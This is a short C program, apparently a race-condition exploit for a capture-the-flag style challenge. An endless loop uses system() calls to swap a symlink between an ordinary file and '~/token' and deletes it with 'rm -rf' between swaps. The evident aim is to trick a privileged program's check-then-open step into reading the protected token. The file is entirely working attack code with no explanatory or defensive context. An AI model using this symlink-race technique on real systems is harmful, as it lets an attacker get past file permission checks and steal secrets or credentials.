#include <stdlib.h>

int main() {
    while(1){
        system("ln -sf file link");
        system("rm -rf link");
        system("ln -sf ~/token link");
        system("rm -rf link");
    }
    return 0;
}